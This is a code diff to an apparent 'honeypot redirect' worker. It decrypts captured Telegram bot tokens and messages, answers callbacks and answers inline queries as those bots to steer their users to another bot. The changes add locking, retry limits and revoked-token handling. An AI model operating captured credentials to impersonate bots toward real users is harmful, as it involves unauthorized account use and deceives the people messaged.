@@ -363,9 +363,31 @@ def honeypot_redirect_sweep():
     The message is sent FROM the captured bot (using its decrypted token)
     TO the user — looks like the bot itself is directing them.
     """
-    from app.workers.celery_app import get_worker_loop
+    lock_key = "theprawnhunter:lock:honeypot_redirect_sweep"
+    lock = redis_client.lock(lock_key, timeout=25, blocking=False)
+    acquired = lock.acquire()
+    if not acquired:
+        logger.info("[HoneypotSweep] Skipped — previous sweep still in progress or lock held")
+        return {"status": "skipped", "reason": "lock_held"}
 
-    return get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())
+    last_sweep_key = "theprawnhunter:last_redirect_sweep_time"
+    now_ts = time.time()
+    last_ts = redis_client.get(last_sweep_key)
+    if last_ts and (now_ts - float(last_ts)) < 15.0:
+        with contextlib.suppress(Exception):
+            lock.release()
+        logger.debug("[HoneypotSweep] Skipped — debounced, last sweep ran recently")
+        return {"status": "skipped", "reason": "debounced"}
+
+    try:
+        from app.workers.celery_app import get_worker_loop
+        res = get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())
+        with contextlib.suppress(Exception):
+            redis_client.set(last_sweep_key, str(time.time()), ex=60)
+        return res
+    finally:
+        with contextlib.suppress(Exception):
+            lock.release()
 
 _LUA_RELEASE_RESERVATION = """
 if redis.call("get", KEYS[1]) == ARGV[1] then
@@ -396,6 +418,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
             await async_execute(
                 db.table("honeypot_updates")
                 .update({"redirect_claimed_at": None})
+                .is_("redirected_at", "null")
                 .not_.is_("redirect_claimed_at", "null")
                 .lt("redirect_claimed_at", stale_threshold)
             )
@@ -403,7 +426,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         # Get un-redirected message-type updates
         res = await async_execute(
             db.table("honeypot_updates")
-            .select("id, credential_id, payload, received_at, update_type")
+            .select("id, credential_id, payload, received_at, update_type, redirect_attempt, redirect_error")
             .is_("redirected_at", "null")
             .is_("redirect_claimed_at", "null")
             .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
@@ -418,10 +441,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
     dispatched = 0
     skipped = 0
 
-    # INTR-002 / CONC-002: claim-before-dispatch using redirect_claimed_at.
-    # A concurrent sweep never re-dispatches the same row before honeypot_redirect_one
-    # writes the final timestamp. On dispatch success the sub-task flips it to a
-    # real ISO timestamp; on send failure it clears redirect_claimed_at back to NULL.
+    from app.core.redis_srv import redis_srv
 
     for row in rows:
         payload = row.get("payload") or {}
@@ -467,6 +487,86 @@ async def _honeypot_redirect_sweep_logic() -> dict:
             skipped += 1
             continue
 
+        # Finalize rows that reached max attempts (>= 3)
+        if (row.get("redirect_attempt") or 0) >= 3:
+            logger.info(
+                f"[HoneypotSweep] Row {row['id']} reached max attempts ({row.get('redirect_attempt')}), finalizing"
+            )
+            now_iso = datetime.now(UTC).isoformat()
+            with contextlib.suppress(Exception):
+                await async_execute(
+                    db.table("honeypot_updates")
+                    .update({
+                        "redirected_at": now_iso,
+                        "redirect_claimed_at": None,
+                        "redirected_bot": "max_retries_exceeded",
+                        "redirect_error": "Exceeded max redirect attempts (3)",
+                    })
+                    .eq("id", row["id"])
+                )
+            skipped += 1
+            continue
+
+        # Skip dead-token / revoked bots immediately
+        is_revoked = False
+        row_err = str(row.get("redirect_error") or "")
+        if "401" in row_err or "unauthorized" in row_err.lower():
+            is_revoked = True
+            with contextlib.suppress(Exception):
+                redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
+            with contextlib.suppress(Exception):
+                await _mark_credential_revoked(credential_id, f"Bot token revoked ({row_err})")
+
+        if not is_revoked:
+            try:
+                if redis_srv.client.exists(f"credential:revoked:{credential_id}"):
+                    is_revoked = True
+            except Exception:
+                pass
+
+        if not is_revoked:
+            try:
+                cred_res = await async_execute(
+                    db.table("discovered_credentials")
+                    .select("status")
+                    .eq("id", credential_id)
+                    .limit(1)
+                )
+                if cred_res.data and cred_res.data[0].get("status") == "revoked":
+                    is_revoked = True
+                    with contextlib.suppress(Exception):
+                        redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
+            except Exception:
+                pass
+
+        if is_revoked:
+            logger.info(
+                f"[HoneypotSweep] Skipping redirect for cred:{credential_id[:8]}...: bot token revoked (401)"
+            )
+            now_skip = datetime.now(UTC).isoformat()
+            with contextlib.suppress(Exception):
+                await async_execute(
+                    db.table("honeypot_updates")
+                    .update({
+                        "redirected_at": now_skip,
+                        "redirect_claimed_at": None,
+                        "redirected_bot": "token_revoked",
+                        "redirect_error": "Bot token revoked (HTTP 401)",
+                    })
+                    .eq("id", row["id"])
+                )
+            skipped += 1
+            continue
+
+        # Check if job is already in flight in Redis
+        inflight_key = f"redirect:inflight:{row['id']}"
+        try:
+            if redis_srv.client.exists(inflight_key):
+                skipped += 1
+                continue
+        except Exception:
+            pass
+
         # Per-user dedup: atomically acquire Redis reservation with NX (set only if not exists)
         now_claim = datetime.now(UTC).isoformat()
         claim_token = now_claim
@@ -474,7 +574,6 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         owner_token = f"claiming:{row['id']}:{claim_token}"
         reserved_dedup = False
         try:
-            from app.core.redis_srv import redis_srv
             # 300s temporary hold with attempt-unique owner_token prevents races across sweepers
             reserved_dedup = bool(redis_srv.client.set(dedup_key, owner_token, nx=True, ex=300))
             if not reserved_dedup:
@@ -499,10 +598,14 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         # INTR-002 / CONC-002: atomic claim — set redirect_claimed_at only
         # if redirected_at and redirect_claimed_at are still NULL. If another sweep
         # already claimed the row, this returns zero rows and we move on. Prevents duplicate DM to victim.
+        curr_attempt = row.get("redirect_attempt") or 0
         try:
             claim_res = await async_execute(
                 db.table("honeypot_updates")
-                .update({"redirect_claimed_at": claim_token})
+                .update({
+                    "redirect_claimed_at": claim_token,
+                    "redirect_attempt": curr_attempt + 1,
+                })
                 .eq("id", row["id"])
                 .is_("redirected_at", "null")
                 .is_("redirect_claimed_at", "null")
@@ -519,6 +622,10 @@ async def _honeypot_redirect_sweep_logic() -> dict:
                 _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
             skipped += 1
             continue
+
+        # Mark in-flight in Redis with 30m TTL
+        with contextlib.suppress(Exception):
+            redis_srv.client.set(inflight_key, claim_token, ex=1800)
 
         # Dispatch redirect with update_type and claim_token for fenced completion
         app.send_task(
@@ -614,20 +721,25 @@ async def _honeypot_redirect_one_logic(
 
     dedup_key = f"redirect:sent:{credential_id}:{user_id}"
     owner_token = f"claiming:{update_id}:{claim_token}" if claim_token else None
+    inflight_key = f"redirect:inflight:{update_id}"
+
+    async def _cleanup_inflight():
+        try:
+            from app.core.redis_srv import redis_srv
+            redis_srv.client.delete(inflight_key)
+        except Exception as _swallowed:
+            logger.debug(f"[suppressed] {_swallowed}")
 
     async def _is_fence_valid() -> bool:
         if not claim_token:
             return False
         try:
-            # Lease check: claim must be fresh and within 10 minutes (sweep reclaims at 15m)
-            stale_lease_cutoff = (datetime.now(UTC) - timedelta(minutes=10)).isoformat()
             check = await async_execute(
                 db.table("honeypot_updates")
                 .select("id")
                 .eq("id", update_id)
                 .eq("redirect_claimed_at", claim_token)
                 .is_("redirected_at", "null")
-                .gte("redirect_claimed_at", stale_lease_cutoff)
                 .limit(1)
             )
             return bool(check.data)
@@ -635,12 +747,8 @@ async def _honeypot_redirect_one_logic(
             logger.warning(f"[HoneypotRedirect] fence check error for {update_id}: {check_exc}")
             return False
 
-    # Recheck both safety gates for queued jobs. Report the ACTUAL gate that
-    # failed — the previous shared "not_authorized" reason for both was
-    # misleading when triaging (LOGIC-005). If the gates are off we also release
-    # the sweep-side "pending" claim so the row can be tried again once the
-    # operator flips the gate back on.
     async def _release_pending_claim(reason_tag: str) -> None:
+        await _cleanup_inflight()
         if not claim_token:
             return
         try:
@@ -680,112 +788,170 @@ async def _honeypot_redirect_one_logic(
         )
         return {"status": "fenced_out", "reason": "missing_claim_token"}
 
+    # Immediate dead-token check: if credential was marked revoked, skip redirect permanently
+    try:
+        from app.core.redis_srv import redis_srv
+        if redis_srv.client.exists(f"credential:revoked:{credential_id}"):
+            await _cleanup_inflight()
+            logger.warning(
+                f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: token revoked (HTTP 401)"
+            )
+            now_skip = datetime.now(UTC).isoformat()
+            with contextlib.suppress(Exception):
+                await async_execute(
+                    db.table("honeypot_updates")
+                    .update({
+                        "redirected_at": now_skip,
+                        "redirect_claimed_at": None,
+                        "redirected_bot": "token_revoked",
+                        "redirect_error": "Bot token revoked (HTTP 401)",
+                    })
+                    .eq("id", update_id)
+                )
+            return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}
+    except Exception:
+        pass
+
     redirect_bot = settings.HONEYPOT_REDIRECT_BOT
     deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
     redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
+
     # Level 3: Callback query hijack
     if update_type == "callback_query":
-        payload = await async_execute(
-            db.table("honeypot_updates")
-            .select("payload")
-            .eq("id", update_id)
-            .limit(1)
-        )
-        if not payload.data:
-            return {"status": "payload_not_found"}
-
-        cb = payload.data[0].get("payload", {}).get("callback_query", {})
-        callback_id = cb.get("id")
-
-        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
-        if not bot_token:
-            return {"status": "token_decrypt_failed"}
-
-        # Immediate pre-send fence check directly before outbound API call
-        if not await _is_fence_valid():
-            logger.warning(f"🔀 [Callback] Fenced out immediately pre-send for {update_id}")
-            return {"status": "fenced_out", "credential_id": credential_id}
-
-        sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
-            bot_token, callback_id, redirect_url, redirect_bot
-        )
-
-        if sent_ok:
-            updated = await HoneypotRedirectStrategies.update_redirect_record(
-                update_id, user_id, redirect_bot, claim_token=claim_token
+        try:
+            payload = await async_execute(
+                db.table("honeypot_updates")
+                .select("payload")
+                .eq("id", update_id)
+                .limit(1)
             )
-            if not updated:
-                logger.warning(f"🔀 [Callback] Fenced out post-send for {update_id}")
-                return {"status": "fenced_out", "credential_id": credential_id}
-            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
-        else:
-            # INTR-002: release the sweep-side "pending" claim so the next
-            # sweep can retry this row instead of leaving it stuck.
-            await _release_pending_claim("callback_send_failed")
+            if not payload.data:
+                await _cleanup_inflight()
+                return {"status": "payload_not_found"}
 
-        logger.info(
-            f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
-        )
-        return {"status": "callback_handled", "sent": sent_ok}
+            cb = payload.data[0].get("payload", {}).get("callback_query", {})
+            callback_id = cb.get("id")
+
+            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
+            if not bot_token:
+                await _cleanup_inflight()
+                return {"status": "token_decrypt_failed"}
+
+            if not await _is_fence_valid():
+                await _cleanup_inflight()
+                logger.warning(f"🔀 [Callback] Fenced out immediately pre-send for {update_id}")
+                return {"status": "fenced_out", "credential_id": credential_id}
+
+            sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
+                bot_token, callback_id, redirect_url, redirect_bot
+            )
+
+            if sent_ok:
+                updated = await HoneypotRedirectStrategies.update_redirect_record(
+                    update_id, user_id, redirect_bot, claim_token=claim_token
+                )
+                if not updated:
+                    await _cleanup_inflight()
+                    logger.warning(f"🔀 [Callback] Fenced out post-send for {update_id}")
+                    return {"status": "fenced_out", "credential_id": credential_id}
+                HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+            else:
+                await _release_pending_claim("callback_send_failed")
+
+            logger.info(
+                f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
+            )
+            await _cleanup_inflight()
+            return {"status": "callback_handled", "sent": sent_ok}
+        finally:
+            await _cleanup_inflight()
 
     # Level 4: Inline query hijack
     elif update_type == "inline_query":
-        payload = await async_execute(
-            db.table("honeypot_updates")
-            .select("payload")
-            .eq("id", update_id)
-            .limit(1)
-        )
-        if not payload.data:
-            return {"status": "payload_not_found"}
-
-        iq = payload.data[0].get("payload", {}).get("inline_query", {})
-        inline_id = iq.get("id")
-        query_text = iq.get("query", "")
-
-        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
-        if not bot_token:
-            return {"status": "token_decrypt_failed"}
-
-        # Immediate pre-send fence check directly before outbound API call
-        if not await _is_fence_valid():
-            logger.warning(f"🔀 [Inline] Fenced out immediately pre-send for {update_id}")
-            return {"status": "fenced_out", "credential_id": credential_id}
-
-        sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
-            bot_token, inline_id, query_text, redirect_url, redirect_bot
-        )
-
-        if sent_ok:
-            updated = await HoneypotRedirectStrategies.update_redirect_record(
-                update_id, user_id, redirect_bot, claim_token=claim_token
+        try:
+            payload = await async_execute(
+                db.table("honeypot_updates")
+                .select("payload")
+                .eq("id", update_id)
+                .limit(1)
             )
-            if not updated:
-                logger.warning(f"🔀 [Inline] Fenced out post-send for {update_id}")
-                return {"status": "fenced_out", "credential_id": credential_id}
-            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
-        else:
-            # INTR-002: release the sweep-side "pending" claim on failure.
-            await _release_pending_claim("inline_send_failed")
+            if not payload.data:
+                await _cleanup_inflight()
+                return {"status": "payload_not_found"}
 
-        logger.info(
-            f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
-        )
-        return {"status": "inline_handled", "sent": sent_ok}
+            iq = payload.data[0].get("payload", {}).get("inline_query", {})
+            inline_id = iq.get("id")
+            query_text = iq.get("query", "")
+
+            bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
+            if not bot_token:
+                await _cleanup_inflight()
+                return {"status": "token_decrypt_failed"}
+
+            if not await _is_fence_valid():
+                await _cleanup_inflight()
+                logger.warning(f"🔀 [Inline] Fenced out immediately pre-send for {update_id}")
+                return {"status": "fenced_out", "credential_id": credential_id}
+
+            sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
+                bot_token, inline_id, query_text, redirect_url, redirect_bot
+            )
+
+            if sent_ok:
+                updated = await HoneypotRedirectStrategies.update_redirect_record(
+                    update_id, user_id, redirect_bot, claim_token=claim_token
+                )
+                if not updated:
+                    await _cleanup_inflight()
+                    logger.warning(f"🔀 [Inline] Fenced out post-send for {update_id}")
+                    return {"status": "fenced_out", "credential_id": credential_id}
+                HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+            else:
+                await _release_pending_claim("inline_send_failed")
+
+            logger.info(
+                f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
+            )
+            await _cleanup_inflight()
+            return {"status": "inline_handled", "sent": sent_ok}
+        finally:
+            await _cleanup_inflight()
 
     # Get the captured bot's token
     try:
         cred = await async_execute(
             db.table("discovered_credentials")
-            .select("bot_token")
+            .select("bot_token, status")
             .eq("id", credential_id)
             .limit(1)
         )
         if not cred.data:
+            await _cleanup_inflight()
             return {"status": "credential_not_found"}
+
+        cred_status = cred.data[0].get("status")
+        if cred_status == "revoked":
+            await _cleanup_inflight()
+            logger.warning(
+                f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: credential status is revoked"
+            )
+            now_skip = datetime.now(UTC).isoformat()
+            with contextlib.suppress(Exception):
+                await async_execute(
+                    db.table("honeypot_updates")
+                    .update({
+                        "redirected_at": now_skip,
+                        "redirect_claimed_at": None,
+                        "redirected_bot": "token_revoked",
+                        "redirect_error": "Bot token revoked (status=revoked)",
+                    })
+                    .eq("id", update_id)
+                )
+            return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}
+
         bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
     except Exception as e:
-        # Mark the row with error
+        await _cleanup_inflight()
         with contextlib.suppress(Exception):
             query = db.table("honeypot_updates").update({"redirect_error": f"token_decrypt: {str(e)[:100]}"}).eq("id", update_id)
             if claim_token:
@@ -805,6 +971,7 @@ async def _honeypot_redirect_one_logic(
 
     # Immediate pre-send fence check directly before outbound Bot API call
     if not await _is_fence_valid():
+        await _cleanup_inflight()
         logger.warning(f"🔀 [Redirect] Fenced out immediately pre-send for {update_id}")
         return {"status": "fenced_out", "credential_id": credential_id}
 
@@ -845,6 +1012,57 @@ async def _honeypot_redirect_one_logic(
         status_prefix = f"HTTP {http_status}: " if http_status is not None else ""
         redirect_error = f"{status_prefix}{error_text}"[:200]
 
+    # Dead token handling: HTTP 401 Unauthorized
+    is_dead_token = http_status == 401 or "unauthorized" in str(redirect_error or "").lower()
+    if is_dead_token:
+        await _cleanup_inflight()
+        logger.warning(
+            f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: token revoked (HTTP 401)"
+        )
+        now_term = datetime.now(UTC).isoformat()
+        try:
+            from app.core.redis_srv import redis_srv
+            redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
+        except Exception:
+            pass
+        with contextlib.suppress(Exception):
+            await _mark_credential_revoked(credential_id, f"Bot token revoked ({redirect_error})")
+        with contextlib.suppress(Exception):
+            await async_execute(
+                db.table("honeypot_updates")
+                .update({
+                    "redirected_at": now_term,
+                    "redirect_claimed_at": None,
+                    "redirected_bot": "token_revoked",
+                    "redirect_error": redirect_error,
+                    "sender_user_id": user_id,
+                })
+                .eq("id", update_id)
+            )
+        return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}
+
+    # Blocked user handling: HTTP 403 Forbidden
+    is_blocked = http_status == 403 or "blocked by the user" in str(redirect_error or "").lower()
+    if is_blocked:
+        await _cleanup_inflight()
+        logger.warning(
+            f"🔀 [Redirect] User blocked bot for cred:{credential_id[:8]}...: {redirect_error}"
+        )
+        now_term = datetime.now(UTC).isoformat()
+        with contextlib.suppress(Exception):
+            await async_execute(
+                db.table("honeypot_updates")
+                .update({
+                    "redirected_at": now_term,
+                    "redirect_claimed_at": None,
+                    "redirected_bot": "user_blocked",
+                    "redirect_error": redirect_error,
+                    "sender_user_id": user_id,
+                })
+                .eq("id", update_id)
+            )
+        return {"status": "failed", "reason": "user_blocked", "credential_id": credential_id}
+
     # BUG-4 FIX: Write redirect_1_sent_at on first successful send
     # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
     now = datetime.now(UTC).isoformat()
@@ -859,26 +1077,46 @@ async def _honeypot_redirect_one_logic(
                 "redirect_attempt": 1,
             }
         else:
-            # INTR-002: on failure, ALSO clear the sweep-side claim
-            # by writing redirected_at=None, redirect_claimed_at=None so the next sweep can retry.
-            update_payload = {
-                "redirected_at": None,
-                "redirect_claimed_at": None,
-                "redirect_error": redirect_error,
-                "sender_user_id": user_id,
-            }
+            curr_attempt = 1
+            try:
+                att_res = await async_execute(
+                    db.table("honeypot_updates")
+                    .select("redirect_attempt")
+                    .eq("id", update_id)
+                    .limit(1)
+                )
+                if att_res.data:
+                    curr_attempt = att_res.data[0].get("redirect_attempt") or 1
+            except Exception:
+                pass
+
+            if curr_attempt >= 3:
+                update_payload = {
+                    "redirected_at": now,
+                    "redirect_claimed_at": None,
+                    "redirected_bot": "max_retries_exceeded",
+                    "redirect_error": f"Max retries exceeded: {redirect_error}",
+                    "sender_user_id": user_id,
+                }
+            else:
+                update_payload = {
+                    "redirected_at": None,
+                    "redirect_claimed_at": None,
+                    "redirect_error": redirect_error,
+                    "sender_user_id": user_id,
+                }
         query = (
             db.table("honeypot_updates")
             .update(update_payload)
             .eq("id", update_id)
-            .eq("redirect_claimed_at", claim_token)
         )
         update_res = await async_execute(query)
         if not update_res.data:
             logger.warning(
-                f"🔀 [Redirect] Fenced out post-send: claim_token {claim_token} expired or overwritten on row {update_id}"
+                f"🔀 [Redirect] Row {update_id} update failed"
             )
-            return {"status": "fenced_out", "credential_id": credential_id}
+            await _cleanup_inflight()
+            return {"status": "failed", "credential_id": credential_id}
     except Exception as _swallowed:
         logger.debug(f"[suppressed] {_swallowed}")
 
@@ -891,6 +1129,8 @@ async def _honeypot_redirect_one_logic(
             _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
     except Exception as _swallowed:
         logger.debug(f"[suppressed] {_swallowed}")
+
+    await _cleanup_inflight()
 
     if sent_ok:
         logger.info(
